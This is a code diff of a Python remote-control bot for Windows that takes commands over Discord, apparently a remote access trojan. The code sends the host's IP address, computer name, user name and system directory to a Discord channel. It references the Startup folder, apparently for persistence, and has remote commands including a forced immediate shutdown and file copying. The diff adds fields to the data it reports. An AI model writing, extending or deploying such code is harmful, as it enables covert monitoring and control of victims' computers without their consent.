@@ -9,6 +9,7 @@ import os
 import sys
 from datetime import datetime
 import win32api
+import win32file
 import discord
 import pyautogui as pg
 from discord.ext import commands
@@ -19,7 +20,6 @@ pg.FAILSAFE = False
 bot = commands.Bot(command_prefix='/')
 channel = bot.get_channel(config.channel)
 bot.remove_command('help')
-print(win32api.GetVersionEx())
 path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
 
 
@@ -47,16 +47,15 @@ async def on_ready():
         minute = '0' + str(minute)
     else:
         pass
-    embed = discord.Embed(title='**USER IS ONLINE**', description='Configuration Administration Tool',
+    embed = discord.Embed(title='**USER ONLINE**', description='Best defense, no offense.',
                           color=0x03fcec, )
-
     embed.add_field(name='**System time**', value=f'{date.hour}:{minute}', inline=False)
     embed.add_field(name='**OS**', value=f'{sys.platform}', inline=False)
     embed.add_field(name='**Screen resolution**', value=f'{x}x{y}', inline=False)
     embed.add_field(name='**IP address**', value=f'{nf.ip()}', inline=False)
     embed.add_field(name='**PC name**', value=f'{win32api.GetComputerName()}', inline=False)
-    embed.add_field(name='**User name**', value=f'{win32api.GetUserName()}', inline=True)
-
+    embed.add_field(name='**User name**', value=f'{win32api.GetUserName()}', inline=False)
+    embed.add_field(name='**Root path**', value=f'{win32api.GetSystemDirectory()}', inline=False)
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
     embed.set_footer(text=f'Use /help for see bot features',
                      icon_url='https://i.imgur.com/YbYKL0F.png')
@@ -185,7 +184,7 @@ async def copy(ctx, way):
 
 @bot.command()
 async def shutdown(ctx):
-    await ctx.send('Shutdown...')
+    await ctx.send('Light out!')
     os.system('shutdown -s -t 0 >null')
 
 
@@ -234,7 +233,7 @@ async def win_info(ctx):
     embed.add_field(name='**Minor version.**', value=str(info[1]), inline=False)
     embed.add_field(name='**Build number.**', value=str(info[2]), inline=False)
     embed.add_field(name='**Platform ID.**', value=str(info[3]), inline=False)
-    embed.add_field(name='**Versio.n**', value=str(info[4]), inline=False)
+    embed.add_field(name='**Version.**', value=str(info[4]), inline=False)
 
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
     embed.set_footer(text=f'Made by NullifiedVlad', icon_url='https://i.imgur.com/YbYKL0F.png')
